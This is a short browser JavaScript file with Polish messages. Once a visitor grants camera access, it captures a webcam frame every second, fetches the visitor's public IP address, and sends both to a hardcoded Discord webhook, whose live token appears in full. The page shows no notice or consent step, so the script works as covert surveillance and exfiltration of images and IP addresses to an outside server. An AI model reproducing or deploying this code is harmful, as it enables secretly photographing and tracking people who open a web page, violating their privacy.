const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let videoStream;

async function startCamera() {
    try {
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.play();

        video.onloadedmetadata = () => {
            setInterval(() => captureAndSend(video), 1000);
        };
    } catch (err) {
        console.error("Błąd dostępu do kamery:", err);
    }
}

async function captureAndSend(video) {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
        let formData = new FormData();
        formData.append('file', blob, 'photo.png');

        try {
            let ipResponse = await fetch('https://api64.ipify.org?format=json');
            let ipData = await ipResponse.json();
            let userIP = ipData.ip;

            formData.append('payload_json', JSON.stringify({
                content: `📸 Nowe zdjęcie! IP użytkownika: ${userIP}`
            }));

            await fetch("https://discord.com/api/webhooks/1341148754161569956/lHJVIyJeOpz2lpBfU_eRjPKKcvmCSw8vAo6X2bE535wvOnwFxRB9yIYIDchCMAx_zVe4", {
                method: "POST",
                body: formData
            });

            console.log("Zdjęcie i IP wysłane!");
        } catch (error) {
            console.error("Błąd wysyłania:", error);
        }
    }, 'image/png');
}

startCamera();